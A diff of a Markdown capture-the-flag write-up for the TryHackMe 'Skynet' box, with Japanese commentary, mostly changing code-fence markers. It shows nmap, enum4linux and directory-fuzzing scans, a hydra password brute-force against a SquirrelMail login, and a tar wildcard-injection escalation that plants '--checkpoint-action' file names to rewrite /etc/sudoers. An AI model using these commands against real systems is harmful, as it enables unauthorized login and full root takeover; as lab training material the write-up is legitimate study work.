@@ -33,14 +33,10 @@ High-quality reconnaissance narrows a large attack surface into a few validated 
 
 ### Not implemented (or log not saved)
 
-```
 
 ## Nmap
-```
+```bash
 nmap -p- -sC -sV -T4 -A -Pn $ip
-```
-
-```
 ✅[22:55][CPU:1][MEM:50][IP:10.11.87.75][...e/n0z0/work/thm/Game_Zone]
 🐉 > nmap -p- -sC -sV -T4 -A -Pn $ip
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 22:56 JST
@@ -95,7 +91,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1736.90 seconds
 
 まずスキャン
 
-```
+```bash
 ✅[22:55][CPU:1][MEM:50][IP:10.11.87.75][...e/n0z0/work/thm/Game_Zone]
 🐉 > nmap -p- -sC -sV -T4 -A -Pn $ip
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 22:56 JST
@@ -142,7 +138,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1736.90 seconds
 
 smbのスキャンで結構いろいろ見つかるね
 
-```
+```bash
 ✅[22:55][CPU:1][MEM:50][IP:10.11.87.75][/home/n0z0]
 🐉 > enum4linux -a $ip
 Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Oct 27 22:56:39 2024
@@ -322,7 +318,7 @@ enum4linux complete on Sun Oct 27 23:20:20 2024
 
 ファジングすると有効そうなサブディレクトリのページが見つかる
 
-```
+```bash
 ❌[1:21][CPU:1][MEM:48][IP:10.11.87.75][/home/n0z0]
 🐉 > feroxbuster -u http://$ip -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -r --timeout 3 --no-state -s 200,301 -e -E
 
@@ -366,7 +362,7 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 
 パスワード解析完了
 
-```
+```bash
 ❌[2:00][CPU:1][MEM:48][IP:10.11.87.75][/home/n0z0]
 🐉 > hydra -l milesdyson -P ~/work/thm/Skynet/log1.txt $ip http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect"
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -449,7 +445,7 @@ limpeaseを実行する
 
 crontab見るとroot権限でシェルが実行されてそう
 
-```
+```bash
 www-data@skynet:/home/milesdyson$ cat /etc/crontab
 cat /etc/crontab
 
@@ -468,9 +464,6 @@ cat /home/milesdyson/backups/backup.sh
 cd /var/www/html
 tar cf /home/milesdyson/backups/backup.tgz *
 www-data@skynet:/home/milesdyson$ echo $shell
-```
-
-```
 cat /home/milesdyson/backups/backup.sh
 #!/bin/bash
 cd /var/www/html
@@ -479,7 +472,6 @@ tar cf /home/milesdyson/backups/backup.tgz *
 
 /var/www/htmlディレクトリは自由にできる。
 
-```
 echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
 echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
 echo "/var/www/html"  > --checkpoint=1
@@ -496,7 +488,7 @@ Initial access succeeds when enumeration findings are turned into a practical ex
 During the privilege escalation phase, we will prioritize checking for misconfigurations such as `sudo -l` / SUID / service settings / token privilege. By starting this check immediately after acquiring a low-privileged shell, you can reduce the chance of getting stuck.
 
 This command is executed during privilege escalation to validate local misconfigurations and escalation paths. We are looking for delegated execution rights, writable sensitive paths, or credential artifacts. Any positive result is immediately chained into a higher-privilege execution attempt.
-```bash
+```
 echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
 echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
 echo "/var/www/html"  > --checkpoint=1
